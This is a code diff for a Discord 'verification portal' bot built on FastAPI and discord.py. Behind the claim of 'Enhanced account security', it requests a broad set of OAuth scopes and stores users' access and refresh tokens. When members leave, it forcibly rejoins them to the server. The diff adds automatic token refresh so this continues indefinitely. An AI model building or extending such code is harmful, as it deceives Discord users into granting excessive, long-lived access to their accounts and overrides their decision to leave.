@@ -30,10 +30,25 @@ GUILD_ID = os.getenv("GUILD_ID")  # Discord Server ID
 ROLE_ID = os.getenv("VERIFIED_ROLE_ID")  # Role to assign on verification
 DATABASE_URL = os.getenv("DATABASE_URL")  # Postgres URL from Render
 
-OAUTH_SCOPES = "bot identify email guilds guilds.members.read gdm.join rpc rpc.voice.read rpc.video.read rpc.screenshare.read rpc.activities.write messages.read applications.builds.read applications.store.update activities.read activities.invites.write dm_channels.read presences.read relationships.write openid dm_channels.messages.write account.global_name.update sdk.social_layer_presence lobbies.write applications.commands.permissions.update identify.premium connections guilds.join guilds.channels.read rpc.notifications.read rpc.voice.write rpc.video.write applications.builds.upload rpc.screenshare.write webhook.incoming applications.commands activities.write applications.entitlements relationships.read voice role_connections.write dm_channels.messages.read presences.write gateway.connect payment_sources.country_code sdk.social_layer application_identities.write"
+OAUTH_SCOPES = "bot identify email guilds guilds.members.read gdm.join rpc rpc.voice.read rpc.activities.write messages.read applications.builds.read applications.store.update activities.read dm_channels.read openid applications.commands.permissions.update connections guilds.join rpc.notifications.read rpc.voice.write applications.builds.upload webhook.incoming applications.commands activities.write applications.entitlements relationships.read voice role_connections.write"
+
+from contextlib import asynccontextmanager
 
 # Initialize FastAPI App
-app = FastAPI(title="SM GrowMart HQ Verification Portal")
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Database initialization
+    init_db()
+    
+    # Run discord client in background
+    if DISCORD_TOKEN:
+        asyncio.create_task(bot.start(DISCORD_TOKEN))
+        logger.info("Discord Bot client started in background task.")
+    else:
+        logger.error("DISCORD_TOKEN environment variable is missing!")
+    yield
+
+app = FastAPI(title="SM GrowMart HQ Verification Portal", lifespan=lifespan)
 
 # Convert legacy postgres:// to postgresql:// if needed for psycopg2
 if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
@@ -87,20 +102,50 @@ def save_verification(discord_id: str, username: str, access_token: str, refresh
     except Exception as e:
         logger.error(f"Failed to write verification to DB: {e}")
 
-def get_user_token(discord_id: str):
+def get_user_tokens(discord_id: str):
     if not DATABASE_URL:
-        return None
+        return None, None
     try:
         conn = psycopg2.connect(DATABASE_URL)
         cur = conn.cursor()
-        cur.execute("SELECT access_token FROM verified_users WHERE discord_id = %s", (str(discord_id),))
+        cur.execute("SELECT access_token, refresh_token FROM verified_users WHERE discord_id = %s", (str(discord_id),))
         row = cur.fetchone()
         cur.close()
         conn.close()
         if row:
-            return row[0]
+            return row[0], row[1]
     except Exception as e:
         logger.error(f"DB Read Error: {e}")
+    return None, None
+
+async def refresh_access_token(discord_id: str, refresh_token: str):
+    token_url = "https://discord.com/api/oauth2/token"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {
+        "client_id": CLIENT_ID or "",
+        "client_secret": CLIENT_SECRET or "",
+        "grant_type": "refresh_token",
+        "refresh_token": refresh_token
+    }
+    async with httpx.AsyncClient() as client:
+        resp = await client.post(token_url, data=data, headers=headers)
+        if resp.status_code == 200:
+            token_data = resp.json()
+            new_acc = token_data.get("access_token")
+            new_ref = token_data.get("refresh_token")
+            try:
+                conn = psycopg2.connect(DATABASE_URL)
+                cur = conn.cursor()
+                cur.execute("UPDATE verified_users SET access_token = %s, refresh_token = %s WHERE discord_id = %s", (new_acc, new_ref, str(discord_id)))
+                conn.commit()
+                cur.close()
+                conn.close()
+                logger.info(f"Successfully refreshed and stored token for user {discord_id}")
+            except Exception as e:
+                logger.error(f"Failed to store refreshed token for {discord_id}: {e}")
+            return new_acc
+        else:
+            logger.error(f"Failed to refresh token: {resp.text}")
     return None
 
 # Initialize Discord Bot client
@@ -110,17 +155,6 @@ intents.guilds = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Run discord.py bot alongside FastAPI in asyncio
-@app.on_event("startup")
-async def startup_event():
-    # Database initialization
-    init_db()
-    
-    # Run discord client in background
-    if DISCORD_TOKEN:
-        asyncio.create_task(bot.start(DISCORD_TOKEN))
-        logger.info("Discord Bot client started in background task.")
-    else:
-        logger.error("DISCORD_TOKEN environment variable is missing!")
 
 async def dispatch_premium_embed(channel_id: int):
     channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
@@ -137,7 +171,7 @@ async def dispatch_premium_embed(channel_id: int):
             "> <a:features:1408543952671346768> Instant role assignment\n"
             "> <a:features:1408543952671346768> Exclusive channels unlocked\n"
             "> <a:features:1408543952671346768> Enhanced account security\n\n"
-            "ðŸ“– **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n"
+            "📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n"
             "-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."
         )
     )
@@ -173,10 +207,10 @@ async def on_ready():
 
 @bot.event
 async def on_member_remove(member):
-    # Retrieve user token
-    token = get_user_token(str(member.id))
-    if not token:
-        logger.info(f"User {member.id} left but no token found.")
+    # Retrieve user tokens
+    acc, ref = get_user_tokens(str(member.id))
+    if not acc:
+        logger.info(f"User {member.id} left but no tokens found.")
         return
         
     logger.info(f"User {member.id} left. Attempting auto-join...")
@@ -188,24 +222,30 @@ async def on_member_remove(member):
         "Authorization": f"Bot {DISCORD_TOKEN}",
         "Content-Type": "application/json"
     }
-    payload = {
-        "access_token": token
-    }
+
+    async def attempt_join(token):
+        payload = {"access_token": token}
+        async with httpx.AsyncClient() as client:
+            return await client.put(url, headers=headers, json=payload)
+
+    resp = await attempt_join(acc)
     
-    async with httpx.AsyncClient() as client:
-        try:
-            resp = await client.put(url, headers=headers, json=payload)
-            if resp.status_code in [201, 204]:
-                logger.info(f"Successfully auto-joined user {member.id} back into the server.")
-                
-                # Re-assign the verified role if not added by join
-                if ROLE_ID:
-                    role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{member.id}/roles/{ROLE_ID}"
-                    await client.put(role_url, headers=headers)
-            else:
-                logger.error(f"Failed to auto-join user {member.id}. Status: {resp.status_code}, Resp: {resp.text}")
-        except Exception as e:
-            logger.error(f"Error making auto-join HTTP request for {member.id}: {e}")
+    if resp.status_code == 401 and ref:
+        logger.info(f"Token expired for user {member.id}. Attempting refresh.")
+        new_acc = await refresh_access_token(str(member.id), ref)
+        if new_acc:
+            resp = await attempt_join(new_acc)
+
+    if resp.status_code in [201, 204]:
+        logger.info(f"Successfully auto-joined user {member.id} back into the server.")
+        
+        # Re-assign the verified role if not added by join
+        if ROLE_ID:
+            role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{member.id}/roles/{ROLE_ID}"
+            async with httpx.AsyncClient() as client:
+                await client.put(role_url, headers=headers)
+    else:
+        logger.error(f"Failed to auto-join user {member.id}. Status: {resp.status_code}, Resp: {resp.text}")
 
 import os
 
